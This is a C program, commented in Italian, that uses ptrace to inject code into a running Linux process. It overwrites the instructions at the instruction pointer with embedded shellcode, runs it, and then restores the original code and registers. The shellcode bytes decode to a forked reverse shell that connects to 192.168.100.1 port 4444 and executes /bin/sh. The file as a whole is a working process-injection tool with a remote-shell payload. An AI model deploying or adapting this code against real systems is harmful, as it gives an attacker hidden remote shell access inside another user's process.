/*
 * Code Overwriting via ptrace
 * 
 * Sovrascrive istruzioni a RIP con shellcode, esegue e ripristina.
 * Più semplice di mmap ma modifica temporaneamente codice originale.
 * 
 * Ispirato da: linux-prinj di Philippe Grégoire
 * https://gitlab.com/pgregoire/linux-prinj/
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/user.h>
#include <sys/wait.h>

#include "../common/ptrace_utils.h"
#include "../common/utils.h"

// lo shellcode inizia con due nop, per gestire decremento rip dopo interruzione syscall
// compilato da ../shellcodes/reverse.asm
unsigned char shellcode[] = {
  0x90, 0x90, 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8,
  0x00, 0x74, 0x02, 0xcd, 0x03, 0x48, 0x31, 0xf6, 0x48, 0xf7, 0xe6, 0x48,
  0xff, 0xc6, 0x6a, 0x02, 0x5f, 0x04, 0x29, 0x0f, 0x05, 0x48, 0x93, 0x52,
  0x68, 0xc0, 0xa8, 0x64, 0x01, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 0x02,
  0x48, 0x89, 0xdf, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58,
  0x0f, 0x05, 0x48, 0x31, 0xf6, 0x6a, 0x03, 0x5e, 0xb8, 0x21, 0x00, 0x00,
  0x00, 0x48, 0x89, 0xdf, 0x48, 0xff, 0xce, 0x0f, 0x05, 0x75, 0xf1, 0x48,
  0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
  0x00, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0,
  0x3b, 0x0f, 0x05
};
int sc_len = 111;

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);

    // Attach
    if (ptrace_attach(pid) < 0) {
        perror("Errore attach");
        return 1;
    }

    // Salva registri
    struct user_regs_struct regs_orig;
    if (ptrace_getregs(pid, &regs_orig) < 0) {
        perror("Errore lettura registri");
        ptrace_detach(pid);
        return 1;
    }

    printf("[+] RIP originale: 0x%llx\n", regs_orig.rip);

    // Backup codice a RIP (stesso size dello shellcode)
    //size_t align_len = align_to_word(sc_len);
    unsigned char *backup_code = malloc(sc_len * sizeof(char));
    if (!backup_code) {
        perror("Errore malloc backup");
        ptrace_detach(pid);
        return 1;
    }

    if (ptrace_read(pid, regs_orig.rip, backup_code, sc_len) < 0) {
        perror("Errore backup codice");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }
    printf("[+] Backup codice: %du bytes\n", sc_len);

    // Sovrascrivi con shellcode
    if (ptrace_write(pid, regs_orig.rip, shellcode, sc_len) < 0) {
        perror("Errore scrittura shellcode");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }
    printf("[+] Shellcode iniettato a 0x%llx\n", regs_orig.rip);

    // Redirect RIP
    struct user_regs_struct regs_mod ;
    memcpy(&regs_mod, &regs_orig, sizeof(regs_orig));
    regs_mod.rip +=2;
    if (ptrace_setregs(pid, &regs_mod) < 0) {
        perror("Errore redirect RIP");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }

    // Esegui shellcode
    if (ptrace_cont(pid, 0) < 0) {
        perror("Errore continue");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }
    // Wait shellcode (deve finire con int3)
    if (waitpid(pid, NULL, 0) != pid) {
        perror("Errore wait");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }
    printf("[+] Shellcode eseguito\n");

    // Ripristina registri
    if (ptrace_setregs(pid, &regs_orig) < 0) {
        perror("Errore ripristino registri");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }

    // Ripristina codice originale
    if (ptrace_write(pid, regs_orig.rip, backup_code, sc_len) < 0) {
        perror("Errore ripristino codice");
        ptrace_detach(pid);
        free(backup_code);
        return 1;
    }
    printf("[+] Codice originale ripristinato\n");

    // Cleanup
    ptrace_detach(pid);
    free(backup_code);

    printf("[+] Completato\n");
    return 0;
}
